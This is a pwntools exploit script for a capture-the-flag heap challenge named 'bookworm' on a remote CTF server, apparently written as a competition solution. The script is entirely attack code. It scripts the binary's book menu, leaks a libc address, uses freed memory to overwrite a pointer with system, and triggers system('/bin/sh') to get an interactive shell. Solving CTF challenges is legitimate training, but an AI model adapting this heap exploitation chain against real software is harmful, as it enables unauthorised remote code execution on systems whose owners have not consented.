from pwn import *

context.binary = elf = ELF('./bookworm')
libc = ELF('./libc.so.6')

p = remote("cha.hackpack.club", 41720)
# p = process('./bookworm')
# gdb.attach(p, 'init-peda')


def choice(num):
    p.sendlineafter(">> ", str(num))


def create(n_sz, name, s_sz, summary):
    choice(1)
    p.sendlineafter("name size: ", str(n_sz))
    p.sendafter("book name: ", name)
    p.sendlineafter("summary size: ", str(s_sz))
    p.sendafter("book summary: ", summary)


def delete(idx):
    choice(2)
    p.sendlineafter("ID (0-10): ", str(idx))


def change(idx, sz, val):
    choice(3)
    p.sendlineafter("ID (0-10): ", str(idx))
    p.sendlineafter("summary size: ", str(sz))
    p.sendafter("summary: ", val)


def read(idx):
    choice(4)
    p.sendlineafter("Book ID (0-10): ", str(idx))


create(0x50, "A"*20, 0x428, "A"*20)
create(0x50, "A"*20, 0x428, "A"*20)

change(0, 0x428, "A")
read(0)
leak = u64(p.recvline(False).ljust(8, '\x00'))
libc_base = leak - 0x3ec041
log.success("Libc: 0x{:x}".format(libc_base))
system = libc_base + libc.symbols['system']
delete(0)
change(1,0x18, p64(system))
change(0, 0x20, '/bin/sh\x00')

read(0)

p.interactive()
p.close()
